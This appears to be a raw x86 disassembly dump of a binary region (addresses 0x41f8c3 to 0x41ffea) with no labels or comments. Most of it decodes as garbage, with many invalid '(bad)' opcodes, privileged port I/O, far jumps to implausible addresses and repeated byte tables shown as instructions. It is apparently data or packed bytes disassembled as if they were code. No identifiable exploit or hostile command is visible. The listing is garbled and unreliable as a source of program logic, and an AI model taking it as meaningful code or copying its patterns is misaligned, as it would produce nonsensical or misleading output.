  41f8c3:	(bad)  
  41f8c4:	std    
  41f8c5:	test   BYTE PTR [ebx+eax*8+0x19],cl
  41f8c9:	ins    DWORD PTR es:[edi],dx
  41f8ca:	aas    
  41f8cb:	rol    edi,1
  41f8cd:	xchg   DWORD PTR [ebx],ecx
  41f8cf:	xchg   edi,eax
  41f8d0:	pusha  
  41f8d1:	into   
  41f8d2:	jb     0x41f8d3
  41f8d4:	jae    0x41f893
  41f8d6:	fldenv [esp+edx*2]
  41f8d9:	inc    eax
  41f8da:	jne    0x41f8cf
  41f8dc:	in     al,0x4d
  41f8de:	mov    edx,0x6c144522
  41f8e3:	or     eax,0x87d8b844
  41f8e8:	push   es
  41f8e9:	mov    ebx,0x88e9bd4a
  41f8ee:	popa   
  41f8ef:	leave  
  41f8f0:	xchg   ecx,eax
  41f8f1:	mov    cl,0x34
  41f8f3:	push   ecx
  41f8f4:	sub    eax,DWORD PTR [eax]
  41f8f6:	push   eax
  41f8f7:	inc    edx
  41f8f8:	scas   al,BYTE PTR es:[edi]
  41f8f9:	test   esp,edi
  41f8fb:	or     dh,BYTE PTR [edx]
  41f8fd:	pop    DWORD PTR [ebp+0x7d]
  41f900:	test   DWORD PTR [edx+ebp*4-0x1c],0xd1d03eca
  41f908:	pop    edi
  41f909:	mov    edx,0x5e58575a
  41f90e:	in     eax,dx
  41f90f:	retf   0x6baf
  41f912:	add    eax,0xfcd62ad2
  41f917:	xchg   ecx,eax
  41f918:	and    eax,0xe2f8e452
  41f91d:	xor    DWORD PTR [esi-0x41],edi
  41f920:	jb     0x41f8ae
  41f922:	rcl    edx,1
  41f924:	(bad)  
  41f925:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f926:	adc    eax,0x190a09f6
  41f92b:	pop    esi
  41f92c:	les    eax,FWORD PTR [edi]
  41f92e:	aaa    
  41f92f:	sub    dh,BYTE PTR [ebx]
  41f931:	mov    esi,0xabb67ced
  41f936:	cli    
  41f937:	popf   
  41f938:	sar    BYTE PTR [ecx-0x4951e0b0],1
  41f93e:	cs mov edx,0x93ffbcc2
  41f944:	fsub   DWORD PTR [edi+eiz*4+0x13f33588]
  41f94b:	xor    BYTE PTR [eax+eiz*8-0x5e],ah
  41f94f:	pop    eax
  41f950:	(bad)  
  41f951:	sbb    bh,bl
  41f953:	iret   
  41f954:	mov    ah,0xec
  41f956:	mov    BYTE PTR [edx+esi*1],bl
  41f959:	cmp    DWORD PTR [edi-0x5d10288f],edx
  41f95f:	addr16 mov edx,0x9c101950
  41f965:	aam    0x84
  41f967:	mov    bh,0xb4
  41f969:	push   edx
  41f96a:	jge    0x41f983
  41f96c:	mov    ds,WORD PTR [esi+ebx*8]
  41f96f:	out    0xf1,eax
  41f971:	xlat   BYTE PTR ds:[ebx]
  41f972:	dec    edi
  41f973:	out    0x5f,al
  41f975:	sub    eax,0x3916d2ba
  41f97a:	adc    al,BYTE PTR [edx+0x4cd3c5b3]
  41f980:	es loope 0x41f920
  41f983:	ins    BYTE PTR es:[edi],dx
  41f984:	xchg   ecx,eax
  41f985:	repnz sbb eax,0x32f30fcc
  41f98b:	sbb    eax,0x2529a8cf
  41f990:	in     eax,dx
  41f991:	arpl   dx,ax
  41f993:	(bad)  
  41f994:	fbld   TBYTE PTR [ebx]
  41f996:	adc    al,0x3b
  41f998:	fisttp WORD PTR ds:0x1dbd64aa
  41f99e:	mov    ds:0xdac3c96d,al
  41f9a3:	or     eax,0xcaa4016
  41f9a8:	(bad)  
  41f9a9:	aaa    
  41f9aa:	inc    edx
  41f9ab:	daa    
  41f9ac:	xor    al,0x1a
  41f9ae:	imul   ebx,DWORD PTR [esi+esi*1-0x74b740f5],0x34bab5bb
  41f9b9:	xchg   edx,eax
  41f9ba:	and    DWORD PTR [eax-0x4b5542c0],eax
  41f9c0:	sbb    ch,BYTE PTR [eax+0x4]
  41f9c3:	dec    esi
  41f9c4:	and    ebp,DWORD PTR [eax]
  41f9c6:	pop    ecx
  41f9c7:	xor    DWORD PTR [edi+0x2d],esp
  41f9ca:	jns    0x41fa32
  41f9cc:	and    BYTE PTR [edi+0x3c52e28c],al
  41f9d2:	mov    ch,0x31
  41f9d4:	call   DWORD PTR [edi]
  41f9d6:	dec    edi
  41f9d7:	je     0x41fa51
  41f9d9:	ins    DWORD PTR es:[edi],dx
  41f9da:	imul   ebp,DWORD PTR [ebp-0x24],0x2941a7
  41f9e1:	xor    ebx,DWORD PTR [ebx+0x8]
  41f9e4:	pop    ebx
  41f9e5:	enter  0x4ffb,0xb9
  41f9e9:	jmp    0x41fa47
  41f9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ec:	mov    DWORD PTR [esi-0x67],edi
  41f9ef:	(bad)  
  41f9f0:	clc    
  41f9f1:	push   edx
  41f9f2:	inc    eax
  41f9f3:	pop    ss
  41f9f4:	pop    eax
  41f9f5:	fistp  WORD PTR [edi]
  41f9f7:	ror    DWORD PTR [edi],1
  41f9f9:	repnz jmp 0x1aaa:0x52f8547b
  41fa01:	jp     0x41f9ee
  41fa03:	cmc    
  41fa04:	(bad)  
  41fa05:	cmp    BYTE PTR [ebx-0x8],bl
  41fa08:	mov    al,0x5b
  41fa0a:	les    edi,FWORD PTR [edx-0x40c6e8]
  41fa10:	es out 0xb0,eax
  41fa13:	add    BYTE PTR [ebp+0x22],ch
  41fa16:	xchg   edx,eax
  41fa17:	cdq    
  41fa18:	mov    eax,0x74f32c26
  41fa1d:	pop    ebx
  41fa1e:	mov    al,ds:0x906ac694
  41fa23:	adc    BYTE PTR [ebx-0x25],cl
  41fa26:	nop
  41fa27:	add    edi,esi
  41fa29:	push   edx
  41fa2a:	cmc    
  41fa2b:	mov    bh,dh
  41fa2d:	push   edx
  41fa2e:	out    dx,al
  41fa2f:	jp     0x41f9b6
  41fa31:	jp     0x41fa8a
  41fa33:	cmp    dh,bh
  41fa35:	push   ds
  41fa36:	(bad)  ds:0xdcec2c38
  41fa3c:	retf   0xe33c
  41fa3f:	sar    BYTE PTR [ecx],cl
  41fa41:	mov    ebx,0x9f81abb6
  41fa46:	mov    al,0x9c
  41fa48:	into   
  41fa49:	mov    esi,0x8b15a643
  41fa4e:	scas   eax,DWORD PTR es:[edi]
  41fa4f:	out    dx,eax
  41fa50:	fsub   QWORD PTR [ebp-0x2a]
  41fa53:	inc    ebp
  41fa54:	ins    BYTE PTR es:[edi],dx
  41fa55:	out    0xf4,eax
  41fa57:	push   ecx
  41fa58:	pushf  
  41fa59:	mov    dh,BYTE PTR [eax-0x67]
  41fa5c:	and    ah,dh
  41fa5e:	aam    0xdf
  41fa60:	in     eax,0xcd
  41fa62:	ins    BYTE PTR es:[edi],dx
  41fa63:	(bad)  
  41fa67:	(bad)  
  41fa68:	dec    edi
  41fa69:	(bad)
  41fa6d:	fs inc esp
  41fa6f:	push   ebx
  41fa70:	push   esp
  41fa71:	pop    ss
  41fa72:	jle    0x41fa1b
  41fa74:	popf   
  41fa75:	sub    al,0xc1
  41fa77:	mov    cl,BYTE PTR [eax-0x3c24d4f3]
  41fa7d:	call   0x689b2a79
  41fa82:	xor    BYTE PTR [eax],cl
  41fa84:	inc    eax
  41fa85:	in     eax,0xf8
  41fa87:	neg    bh
  41fa89:	mov    bh,0xe4
  41fa8b:	jmp    0xd652:0x1907afbf
  41fa92:	push   0xaa0cb5ac
  41fa97:	es ds stc 
  41fa9a:	jl     0x41fa87
  41fa9c:	loopne 0x41fa3f
  41fa9e:	jge    0x41fabd
  41faa0:	rol    al,0x48
  41faa3:	mov    ebx,0x8b100044
  41faa8:	jl     0x41faad
  41faaa:	adc    BYTE PTR [ebp-0x2207de31],cl
  41fab0:	and    al,0xcb
  41fab2:	stc    
  41fab3:	inc    ebx
  41fab4:	or     bh,dh
  41fab6:	fadd   DWORD PTR [edi-0x63]
  41fab9:	outs   dx,BYTE PTR ds:[esi]
  41faba:	dec    eax
  41fabb:	xchg   BYTE PTR [ecx-0x10],ch
  41fabe:	rcl    DWORD PTR [edi+eiz*8],cl
  41fac1:	cs and eax,0x238827aa
  41fac7:	shl    BYTE PTR [eax+ecx*1],cl
  41faca:	outs   dx,DWORD PTR ds:[esi]
  41facb:	mov    al,ds:0x333d77a9
  41fad0:	retf   
  41fad1:	imul   ebp,DWORD PTR [esi],0x7295aaa2
  41fad7:	push   ebx
  41fad8:	push   ss
  41fad9:	dec    esi
  41fada:	mov    ds:0x5455aec6,al
  41fadf:	push   ds
  41fae0:	bound  edi,QWORD PTR [ecx-0x28]
  41fae3:	push   0x48
  41fae5:	imul   eax,DWORD PTR [esi],0x71
  41fae8:	fld    TBYTE PTR [ebx+0x47f43be7]
  41faee:	jmp    0x41faf6
  41faf0:	push   0xd956e220
  41faf5:	call   0xfa1f76ce
  41fafa:	mov    bl,0x5b
  41fafc:	mov    ds:0x745d56c,eax
  41fb01:	div    BYTE PTR [ebx-0x595caab3]
  41fb07:	repz cdq 
  41fb09:	aas    
  41fb0a:	xor    eax,0x1a1d01ed
  41fb0f:	push   cs
  41fb10:	sti    
  41fb11:	push   cs
  41fb12:	ja     0x41fb47
  41fb14:	sbb    al,0x60
  41fb16:	sbb    BYTE PTR [edi],bl
  41fb18:	pop    ss
  41fb19:	adc    ecx,DWORD PTR [esp+ecx*1]
  41fb1c:	jg     0x41fb27
  41fb1e:	adc    bl,BYTE PTR [ebp+ebx*1+0xa]
  41fb22:	sahf   
  41fb23:	pop    esp
  41fb24:	gs xchg esi,eax
  41fb26:	push   0x79
  41fb28:	cwde   
  41fb29:	or     ebp,edi
  41fb2b:	mov    DWORD PTR [edi],edi
  41fb2d:	mov    edx,0xe7e8d88d
  41fb32:	addr16 push esi
  41fb34:	test   al,0xea
  41fb36:	not    DWORD PTR ds:0x8c1567f4
  41fb3c:	mov    ecx,0xf47ba9ed
  41fb41:	imul   ebp,DWORD PTR [ebx-0x32],0xc64ed413
  41fb48:	stos   DWORD PTR es:[edi],eax
  41fb49:	(bad)
  41fb4c:	sahf   
  41fb4d:	stos   BYTE PTR es:[edi],al
  41fb4e:	lds    esi,FWORD PTR [ebx-0x34]
  41fb51:	pop    ebx
  41fb52:	jecxz  0x41fb48
  41fb54:	clc    
  41fb55:	jns    0x41fb4d
  41fb57:	std    
  41fb58:	test   esi,ebx
  41fb5a:	cmp    bl,ah
  41fb5c:	nop
  41fb5d:	sbb    ebp,0xf3c2a0d0
  41fb63:	cdq    
  41fb64:	pop    eax
  41fb65:	out    dx,al
  41fb66:	fnstenv [ebx-0x20fb2a0]
  41fb6c:	cli    
  41fb6d:	cmc    
  41fb6e:	xor    DWORD PTR [edx-0x465454ce],0xacbb96de
  41fb78:	jmp    0x2ee7ab42
  41fb7d:	(bad)  
  41fb7e:	mov    WORD PTR [eax+0x5c8bc8ba],gs
  41fb84:	aam    0x95
  41fb86:	test   BYTE PTR [eax-0x7c6f5025],cl
  41fb8c:	cwde   
  41fb8d:	mov    esi,0xa0827cbc
  41fb92:	std    
  41fb93:	mov    ch,0x64
  41fb95:	jne    0x41fb33
  41fb97:	mov    esp,0x319c86a9
  41fb9c:	push   ss
  41fb9d:	icebp  
  41fb9e:	mov    bl,0x8c
  41fba0:	push   ebx
  41fba1:	out    0x18,eax
  41fba3:	xchg   ecx,eax
  41fba4:	inc    edi
  41fba5:	jmp    0xb4f0471a
  41fbaa:	sbb    al,0x64
  41fbac:	adc    al,dl
  41fbae:	jo     0x41fc0a
  41fbb0:	imul   ecx,DWORD PTR [ebp+0x62],0xa79cdd64
  41fbb7:	push   edi
  41fbb8:	in     al,0x71
  41fbba:	int3   
  41fbbb:	xrelease mov DWORD PTR [edi+ebx*2+0x6fa31b83],esi
  41fbc3:	ins    DWORD PTR es:[edi],dx
  41fbc4:	ror    ecx,cl
  41fbc6:	inc    edx
  41fbc7:	inc    esi
  41fbc8:	cmp    DWORD PTR [eax-0x52],eax
  41fbcb:	and    eax,DWORD PTR [esi+0x60]
  41fbce:	push   esi
  41fbcf:	mov    edi,0x956b76bb
  41fbd4:	gs push es
  41fbd6:	or     eax,0x1cd931e1
  41fbdb:	add    al,0x7c
  41fbdd:	stc    
  41fbde:	test   al,0xf1
  41fbe0:	adc    bl,dh
  41fbe2:	sub    ebx,DWORD PTR [eax+0x4fc92614]
  41fbe8:	in     eax,0x5b
  41fbea:	inc    ecx
  41fbeb:	pop    edi
  41fbec:	shl    DWORD PTR [ebx-0x3eefb384],cl
  41fbf2:	and    al,0x74
  41fbf4:	jo     0x41fbd3
  41fbf6:	sub    BYTE PTR [eax+0x70],dh
  41fbf9:	test   al,0xea
  41fbfb:	fsubr  DWORD PTR [ebx-0x7b]
  41fbfe:	clc    
  41fbff:	jmp    0x604fb062
  41fc04:	pushf  
  41fc05:	pusha  
  41fc06:	pop    ss
  41fc07:	xchg   edx,eax
  41fc08:	push   edi
  41fc09:	stos   DWORD PTR es:[edi],eax
  41fc0a:	or     BYTE PTR [esp+edx*4],0x68
  41fc0e:	ins    BYTE PTR es:[edi],dx
  41fc0f:	sbb    DWORD PTR [ecx+ebx*2-0x50],esi
  41fc13:	cwde   
  41fc14:	sub    esi,DWORD PTR [eax+0x74]
  41fc17:	je     0x41fc20
  41fc19:	push   ecx
  41fc1a:	retf   
  41fc1b:	jp     0x41fc62
  41fc1d:	enter  0x946c,0x33
  41fc21:	jl     0x41fba3
  41fc23:	adc    BYTE PTR [edx-0xa8208c0],0xc5
  41fc2a:	and    ah,BYTE PTR [ebp+0x58]
  41fc2d:	pusha  
  41fc2e:	ror    DWORD PTR [eax+esi*2-0x1ea24474],0x80
  41fc36:	jl     0x41fc0e
  41fc38:	push   0xbc759894
  41fc3d:	xor    al,0x4d
  41fc3f:	je     0x41fc2d
  41fc41:	iret   
  41fc42:	mov    bl,0x6b
  41fc44:	dec    ebx
  41fc45:	mov    esp,0x4419ec35
  41fc4a:	mov    al,ds:0xac844c04
  41fc4f:	lods   al,BYTE PTR ds:[esi]
  41fc50:	push   eax
  41fc51:	out    dx,eax
  41fc52:	mov    al,0xcf
  41fc54:	dec    esp
  41fc55:	mov    al,0xc7
  41fc57:	mov    esi,0xcdbd48c8
  41fc5c:	mov    esi,0xcb3d443d
  41fc61:	mov    edx,0x4d518381
  41fc66:	add    DWORD PTR [ecx+0x39],esi
  41fc69:	sahf   
  41fc6a:	inc    ebx
  41fc6b:	xor    ebx,esp
  41fc6d:	cmp    BYTE PTR [edi],bh
  41fc6f:	push   0xd25e2192
  41fc74:	add    ch,BYTE PTR [ebx-0x613da12f]
  41fc7a:	retf   0x1b0a
  41fc7d:	in     eax,dx
  41fc7e:	adc    eax,0x1f2e389f
  41fc83:	loope  0x41fca4
  41fc85:	cmc    
  41fc86:	sub    eax,0x17e5030c
  41fc8b:	jmp    0xc1711b2a
  41fc90:	xchg   esp,eax
  41fc91:	enter  0x7bd8,0x88
  41fc95:	aam    0xe8
  41fc97:	xchg   edi,eax
  41fc98:	ss clc 
  41fc9a:	clc    
  41fc9b:	clc    
  41fc9c:	add    al,0xf8
  41fc9e:	or     BYTE PTR [ebp+0x2698fcff],ch
  41fca4:	cld    
  41fca5:	add    BYTE PTR [eax+0x4604f80f],bl
  41fcab:	push   ebp
  41fcac:	or     ecx,DWORD PTR [eax]
  41fcae:	test   BYTE PTR [ebx+0xf],al
  41fcb1:	or     al,0x9c
  41fcb3:	pop    edi
  41fcb4:	adc    edx,DWORD PTR [eax]
  41fcb6:	adc    al,0x14
  41fcb8:	sub    BYTE PTR [eax+ebx*4],dl
  41fcbb:	push   edi
  41fcbc:	sbb    ebx,DWORD PTR [eax]
  41fcbe:	cwde   
  41fcbf:	push   ebx
  41fcc0:	pop    ds
  41fcc1:	sbb    al,0x98
  41fcc3:	xchg   DWORD PTR [ebp+0x65],esp
  41fcc6:	aam    0xab
  41fcc8:	mov    al,ds:0x24283a86
  41fccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcce:	ins    DWORD PTR es:[edi],dx
  41fccf:	das    
  41fcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcd1:	js     0x41fce7
  41fcd3:	xor    al,0xbb
  41fcd5:	data16 cmp dl,dh
  41fcd8:	fstp   TBYTE PTR ss:[ebx-0x9eac606]
  41fcdf:	mov    bh,0x76
  41fce1:	shl    BYTE PTR [ebx-0x80],0x83
  41fce5:	clc    
  41fce6:	cmp    al,0x12
  41fce8:	je     0x41fd3c
  41fcea:	sub    al,0xd9
  41fcec:	dec    ecx
  41fced:	dec    eax
  41fcee:	dec    esp
  41fcef:	dec    esp
  41fcf0:	mov    al,0xc9
  41fcf2:	xchg   esp,eax
  41fcf3:	push   esp
  41fcf4:	add    DWORD PTR ds:0x2020d05,eax
  41fcfa:	aad    0xc0
  41fcfc:	cmovle ebx,DWORD PTR [esp+ecx*2-0x29]
  41fd01:	or     DWORD PTR [eax+0x32],edi
  41fd04:	jmp    0x41fc8e
  41fd06:	push   cs
  41fd07:	and    al,0x0
  41fd09:	fs js  0x41fd74
  41fd0c:	xchg   esp,eax
  41fd0d:	imul   ebx,DWORD PTR [edi],0xfb6c0668
  41fd13:	cmp    eax,0xf9be757c
  41fd18:	mov    DWORD PTR [ebp-0x58],esi
  41fd1b:	and    dh,bl
  41fd1d:	sub    BYTE PTR [esi+ebp*1],0xf7
  41fd21:	dec    ecx
  41fd22:	or     eax,ebp
  41fd24:	pushf  
  41fd25:	test   DWORD PTR [esi+0x9],eax
  41fd28:	or     BYTE PTR [ebx],0xc3
  41fd2b:	test   al,0x3
  41fd2d:	int    0x90
  41fd2f:	mov    DWORD PTR [esi+0x1],ecx
  41fd32:	cwde   
  41fd33:	sbb    ebx,ebx
  41fd35:	mov    WORD PTR [edi-0x6b26e09a],ss
  41fd3b:	popf   
  41fd3c:	push   edx
  41fd3d:	or     ebx,edi
  41fd3f:	adc    al,0xc5
  41fd42:	mul    BYTE PTR [ecx-0x5e030193]
  41fd48:	out    0xac,eax
  41fd4a:	and    edx,DWORD PTR [eax-0x6]
  41fd4d:	and    eax,0x50ea215c
  41fd52:	xor    esi,DWORD PTR [eax-0x50]
  41fd55:	popf   
  41fd56:	inc    esp
  41fd57:	aas    
  41fd58:	loop   0x41fd16
  41fd5a:	xor    esi,ebp
  41fd5c:	mov    al,0x37
  41fd5e:	repnz test al,0x43
  41fd61:	gs dec ecx
  41fd63:	inc    edi
  41fd64:	call   ebp
  41fd66:	(bad)  
  41fd67:	aam    0x4f
  41fd69:	xor    al,0x43
  41fd6b:	test   eax,ebx
  41fd6d:	xchg   esi,eax
  41fd6e:	daa    
  41fd6f:	ror    bh,0x2
  41fd72:	mov    eax,0xd4d0acd0
  41fd77:	mov    esi,0xcb278d28
  41fd7c:	push   ebx
  41fd7d:	adc    al,BYTE PTR [esi-0x447c7c7e]
  41fd83:	mov    edi,0xe4e4001f
  41fd88:	sbb    ah,ah
  41fd8a:	call   0xed2a1277
  41fd8f:	in     al,dx
  41fd90:	adc    ah,ch
  41fd92:	lock lock or al,0xf0
  41fd96:	hlt    
  41fd97:	hlt    
  41fd98:	or     ah,dh
  41fd9a:	clc    
  41fd9b:	clc    
  41fd9c:	add    al,0xf8
  41fd9e:	cld    
  41fd9f:	cld    
  41fda0:	add    ah,bh
  41fda2:	add    BYTE PTR [eax],al
  41fda4:	cld    
  41fda5:	add    BYTE PTR [esp+eax*1],al
  41fda8:	clc    
  41fda9:	add    al,0x8
  41fdab:	or     ah,dh
  41fdad:	or     BYTE PTR [esp+ecx*1],cl
  41fdb0:	lock or al,0x10
  41fdb3:	adc    ah,ch
  41fdb5:	adc    BYTE PTR [esp+edx*1],dl
  41fdb8:	call   0xe45a15d1
  41fdbd:	sbb    BYTE PTR [esp+ebx*1],bl
  41fdc0:	loopne 0x41fdde
  41fdc2:	and    BYTE PTR [eax],ah
  41fdc4:	fsub   QWORD PTR [eax]
  41fdc6:	and    al,0x24
  41fdc8:	fsub   DWORD PTR [eax+ebp*1]
  41fdcb:	sub    ah,dl
  41fdcd:	sub    BYTE PTR [esp+ebp*1],ch
  41fdd0:	shr    BYTE PTR [eax+esi*1],1
  41fdd3:	xor    ah,cl
  41fdd5:	xor    BYTE PTR [esp+esi*1],dh
  41fdd8:	enter  0x3834,0x38
  41fddc:	les    edi,FWORD PTR [eax]
  41fdde:	cmp    al,0x3c
  41fde0:	sar    BYTE PTR [eax+eax*2],0x40
  41fde4:	mov    esp,0xb8444440
  41fde9:	inc    esp
  41fdea:	dec    eax
  41fdeb:	dec    eax
  41fdec:	mov    ah,0x48
  41fdee:	dec    esp
  41fdef:	dec    esp
  41fdf0:	mov    al,0x4c
  41fdf2:	push   eax
  41fdf3:	push   eax
  41fdf4:	lods   al,BYTE PTR ds:[esi]
  41fdf5:	push   eax
  41fdf6:	push   esp
  41fdf7:	push   esp
  41fdf8:	test   al,0x54
  41fdfa:	pop    eax
  41fdfb:	pop    eax
  41fdfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdfd:	pop    eax
  41fdfe:	pop    esp
  41fdff:	pop    esp
  41fe00:	mov    al,ds:0x9c60605c
  41fe05:	pusha  
  41fe06:	fs fs cwde 
  41fe09:	fs push 0x6c689468
  41fe0f:	ins    BYTE PTR es:[edi],dx
  41fe10:	nop
  41fe11:	ins    BYTE PTR es:[edi],dx
  41fe12:	jo     0x41fe84
  41fe14:	mov    WORD PTR [eax+0x74],?
  41fe17:	je     0x41fda1
  41fe19:	je     0x41fe93
  41fe1b:	js     0x41fda1
  41fe1d:	js     0x41fe9b
  41fe1f:	jl     0x41fda1
  41fe21:	jl     0x41fda3
  41fe23:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41fe28:	js     0x41fdae
  41fe2a:	mov    BYTE PTR [eax-0x7373778c],cl
  41fe30:	jo     0x41fdbe
  41fe32:	nop
  41fe33:	nop
  41fe34:	ins    BYTE PTR es:[edi],dx
  41fe35:	nop
  41fe36:	xchg   esp,eax
  41fe37:	xchg   esp,eax
  41fe38:	push   0x64989894
  41fe3d:	cwde   
  41fe3e:	pushf  
  41fe3f:	pushf  
  41fe40:	pusha  
  41fe41:	pushf  
  41fe42:	mov    al,ds:0xa4a05ca0
  41fe47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe48:	pop    eax
  41fe49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4a:	test   al,0xa8
  41fe4c:	push   esp
  41fe4d:	test   al,0xac
  41fe4f:	lods   al,BYTE PTR ds:[esi]
  41fe50:	push   eax
  41fe51:	lods   al,BYTE PTR ds:[esi]
  41fe52:	mov    al,0xb0
  41fe54:	dec    esp
  41fe55:	mov    al,0xb4
  41fe57:	mov    ah,0x48
  41fe59:	mov    ah,0xb8
  41fe5b:	mov    eax,0xbcbcb844
  41fe60:	inc    eax
  41fe61:	mov    esp,0xc03cc0c0
  41fe66:	(bad)  
  41fe67:	les    edi,FWORD PTR [eax]
  41fe69:	(bad)  
  41fe6a:	enter  0x34c8,0xc8
  41fe6e:	int3   
  41fe6f:	int3   
  41fe70:	xor    ah,cl
  41fe72:	rcl    al,1
  41fe74:	sub    al,0xd0
  41fe76:	aam    0xd4
  41fe78:	sub    ah,dl
  41fe7a:	fcomp  st(0)
  41fe7c:	and    al,0xd8
  41fe7e:	(bad)  
  41fe80:	and    ah,bl
  41fe82:	loopne 0x41fe64
  41fe84:	sbb    al,0xe0
  41fe86:	in     al,0xe4
  41fe88:	sbb    ah,ah
  41fe8a:	call   0xed2a1377
  41fe8f:	in     al,dx
  41fe90:	adc    ah,ch
  41fe92:	lock lock or al,0xf0
  41fe96:	hlt    
  41fe97:	hlt    
  41fe98:	or     ah,dh
  41fe9a:	clc    
  41fe9b:	clc    
  41fe9c:	add    al,0xf8
  41fe9e:	cld    
  41fe9f:	cld    
  41fea0:	add    ah,bh
  41fea2:	add    BYTE PTR [eax],ah
  41fea4:	std    
  41fea5:	add    BYTE PTR [eax],cl
  41fea7:	add    al,0xf8
  41fea9:	add    al,0x4f
  41feab:	xor    esi,esp
  41fead:	or     BYTE PTR [esp+ebx*2],cl
  41feb0:	(bad)  
  41feb2:	sbb    al,0x10
  41feb4:	in     al,dx
  41feb5:	adc    BYTE PTR [eax],al
  41feb7:	sub    BYTE PTR [ecx],cl
  41feb9:	sub    BYTE PTR [eax],bl
  41febb:	sbb    ah,ah
  41febd:	sbb    BYTE PTR [esp+ebx*1],bl
  41fec0:	loopne 0x41fede
  41fec2:	and    BYTE PTR [eax],ah
  41fec4:	fsub   QWORD PTR [eax]
  41fec6:	and    al,0x24
  41fec8:	fsub   DWORD PTR [eax+ebp*1]
  41fecb:	sub    ah,dl
  41fecd:	sub    BYTE PTR [esp+ebp*1],ch
  41fed0:	shr    BYTE PTR [eax+esi*1],1
  41fed3:	xor    ah,cl
  41fed5:	xor    BYTE PTR [esp+esi*1],dh
  41fed8:	enter  0x3834,0x38
  41fedc:	les    edi,FWORD PTR [eax]
  41fede:	cmp    al,0x3c
  41fee0:	sar    BYTE PTR [eax+eax*2],0x40
  41fee4:	mov    esp,0xb8444440
  41fee9:	inc    esp
  41feea:	dec    eax
  41feeb:	dec    eax
  41feec:	mov    ah,0x48
  41feee:	dec    esp
  41feef:	dec    esp
  41fef0:	mov    al,0x4c
  41fef2:	push   eax
  41fef3:	push   eax
  41fef4:	lods   al,BYTE PTR ds:[esi]
  41fef5:	push   eax
  41fef6:	push   esp
  41fef7:	push   esp
  41fef8:	test   al,0x54
  41fefa:	pop    eax
  41fefb:	pop    eax
  41fefc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fefd:	pop    eax
  41fefe:	pop    esp
  41feff:	pop    esp
  41ff00:	mov    al,ds:0x9c60605c
  41ff05:	pusha  
  41ff06:	fs fs cwde 
  41ff09:	fs push 0x6c689468
  41ff0f:	ins    BYTE PTR es:[edi],dx
  41ff10:	nop
  41ff11:	ins    BYTE PTR es:[edi],dx
  41ff12:	jo     0x41ff84
  41ff14:	mov    WORD PTR [eax+0x74],?
  41ff17:	je     0x41fea1
  41ff19:	je     0x41ff93
  41ff1b:	js     0x41fea1
  41ff1d:	js     0x41ff9b
  41ff1f:	jl     0x41fea1
  41ff21:	jl     0x41fea3
  41ff23:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41ff28:	js     0x41feae
  41ff2a:	mov    BYTE PTR [eax-0x7373778c],cl
  41ff30:	jo     0x41febe
  41ff32:	nop
  41ff33:	nop
  41ff34:	ins    BYTE PTR es:[edi],dx
  41ff35:	nop
  41ff36:	xchg   esp,eax
  41ff37:	xchg   esp,eax
  41ff38:	push   0x64989894
  41ff3d:	cwde   
  41ff3e:	pushf  
  41ff3f:	pushf  
  41ff40:	pusha  
  41ff41:	pushf  
  41ff42:	mov    al,ds:0xa4a05ca0
  41ff47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff48:	pop    eax
  41ff49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4a:	test   al,0xa8
  41ff4c:	push   esp
  41ff4d:	test   al,0xac
  41ff4f:	lods   al,BYTE PTR ds:[esi]
  41ff50:	push   eax
  41ff51:	lods   al,BYTE PTR ds:[esi]
  41ff52:	mov    al,0xb0
  41ff54:	dec    esp
  41ff55:	mov    al,0xb4
  41ff57:	mov    ah,0x48
  41ff59:	mov    ah,0xb8
  41ff5b:	mov    eax,0xbcbcb844
  41ff60:	inc    eax
  41ff61:	mov    esp,0xc03cc0c0
  41ff66:	(bad)  
  41ff67:	les    edi,FWORD PTR [eax]
  41ff69:	(bad)  
  41ff6a:	enter  0x34c8,0xc8
  41ff6e:	int3   
  41ff6f:	int3   
  41ff70:	xor    ah,cl
  41ff72:	rcl    al,1
  41ff74:	sub    al,0xd0
  41ff76:	aam    0xd4
  41ff78:	sub    ah,dl
  41ff7a:	fcomp  st(0)
  41ff7c:	and    al,0xd8
  41ff7e:	(bad)  
  41ff80:	and    ah,bl
  41ff82:	loopne 0x41ff64
  41ff84:	sbb    al,0xe0
  41ff86:	in     al,0xe4
  41ff88:	sbb    ah,ah
  41ff8a:	call   0xed2a1477
  41ff8f:	in     al,dx
  41ff90:	adc    ah,ch
  41ff92:	lock lock or al,0xf0
  41ff96:	hlt    
  41ff97:	hlt    
  41ff98:	or     ah,dh
  41ff9a:	clc    
  41ff9b:	clc    
  41ff9c:	add    al,0xf8
  41ff9e:	cld    
  41ff9f:	cld    
  41ffa0:	add    ah,bh
  41ffa2:	add    BYTE PTR [eax],al
  41ffa4:	cld    
  41ffa5:	add    BYTE PTR [esp+eax*1],al
  41ffa8:	clc    
  41ffa9:	add    al,0x8
  41ffab:	or     ah,dh
  41ffad:	or     BYTE PTR [esp+ecx*1],cl
  41ffb0:	lock or al,0x10
  41ffb3:	adc    ah,ch
  41ffb5:	adc    BYTE PTR [esp+edx*1],dl
  41ffb8:	call   0xe45a17d1
  41ffbd:	sbb    BYTE PTR [esp+ebx*1],bl
  41ffc0:	loopne 0x41ffde
  41ffc2:	and    BYTE PTR [eax],ah
  41ffc4:	fsub   QWORD PTR [eax]
  41ffc6:	and    al,0x24
  41ffc8:	fsub   DWORD PTR [eax+ebp*1]
  41ffcb:	sub    ah,dl
  41ffcd:	sub    BYTE PTR [esp+ebp*1],ch
  41ffd0:	shr    BYTE PTR [eax+esi*1],1
  41ffd3:	xor    ah,cl
  41ffd5:	xor    BYTE PTR [esp+esi*1],dh
  41ffd8:	enter  0x3834,0x38
  41ffdc:	les    edi,FWORD PTR [eax]
  41ffde:	cmp    al,0x3c
  41ffe0:	sar    BYTE PTR [eax+eax*2],0x40
  41ffe4:	mov    esp,0xb8444440
  41ffe9:	inc    esp
  41ffea:	dec    eax
